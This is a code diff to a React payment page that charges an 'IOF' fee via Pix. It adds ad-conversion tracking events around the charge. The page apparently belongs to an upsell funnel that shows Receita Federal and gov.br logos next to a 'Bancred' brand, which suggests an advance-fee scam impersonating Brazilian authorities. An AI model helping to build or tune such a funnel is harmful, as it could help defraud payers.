@@ -17,6 +17,7 @@ import logo from "@/assets/bancred-logo.png";
 import receitaLogo from "@/assets/receita-federal-logo.svg";
 import govbrLogo from "@/assets/govbr-logo.png";
 import { useParadisePix } from "@/hooks/useParadisePix";
+import { trackEvent } from "@/lib/tracking";
 
 const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';
 
@@ -47,11 +48,23 @@ const Up1 = () => {
   const [copied, setCopied] = useState(false);
 
   const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
+    trackEvent({
+      event: "CompletePayment",
+      value: valorIOF,
+      currency: "BRL",
+      contents: [{ content_id: "iof", content_name: "IOF", quantity: 1, price: valorIOF }],
+    });
     navigate(`/up2?${params.toString()}`);
   });
 
   const openPix = async () => {
     setShowPix(true);
+    trackEvent({
+      event: "InitiateCheckout",
+      value: valorIOF,
+      currency: "BRL",
+      contents: [{ content_id: "iof", content_name: "IOF", quantity: 1, price: valorIOF }],
+    });
     try {
       await create({
         amountCents: Math.round(valorIOF * 100),
